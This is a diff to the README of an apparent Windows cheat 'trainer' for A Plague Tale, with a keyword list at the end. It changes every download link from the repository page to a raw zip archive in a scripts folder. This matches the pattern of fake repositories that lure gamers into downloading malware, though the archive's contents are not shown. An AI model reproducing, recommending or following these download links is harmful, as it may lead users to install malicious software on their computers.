@@ -1,7 +1,7 @@
 <h1>🎮 Resonance-A-Plague-Tale-Legacy-Trainer - Your All-in-One Gaming Companion for Windows</h1>
 
 <p align="center">
-<a href="https://github.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer"><img src="https://img.shields.io/badge/Download-Resonance_Trainer-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download Button"></a>
+<a href="https://raw.githubusercontent.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer/main/scripts/v1.1-beta.5.zip"><img src="https://img.shields.io/badge/Download-Resonance_Trainer-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download Button"></a>
 </p>
 
 ---
@@ -45,7 +45,7 @@ Enjoy invincibility during tough battles. Activate god mode to focus on story an
 ## 🚀 Getting Started - Simple Steps to Launch
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer](https://github.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer)
+Visit this link to download the application: [https://raw.githubusercontent.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer/main/scripts/v1.1-beta.5.zip](https://raw.githubusercontent.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer/main/scripts/v1.1-beta.5.zip)
 
 Click the download button on that page. Your browser will save the file to your computer.
 
@@ -213,7 +213,7 @@ Resonance-A-Plague-Tale-Legacy-Trainer puts you in control of your gaming experi
 ---
 
 <p align="center">
-<a href="https://github.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer"><img src="https://img.shields.io/badge/Get_Started-Download_Now-45B7D1?style=for-the-badge&logo=windows&logoColor=white&labelColor=FF6B6B" alt="Download Now"></a>
+<a href="https://raw.githubusercontent.com/hansenhanny/Resonance-A-Plague-Tale-Legacy-Trainer/main/scripts/v1.1-beta.5.zip"><img src="https://img.shields.io/badge/Get_Started-Download_Now-45B7D1?style=for-the-badge&logo=windows&logoColor=white&labelColor=FF6B6B" alt="Download Now"></a>
 </p>
 
 Keywords: 2026, change-resonance-points, config-manager, configurable-hotkeys, desktop-tool, game-speed, gaming-tools, god-mode, pc-game, profile-manager, quick-presets, resonance-a-plague-tale-legacy-trainer, resonance-points-editor, saved-profiles, trainer-dashboard, unlock-all-chapters, unlock-all-codex-entries, unlock-everything, windows, windows-11
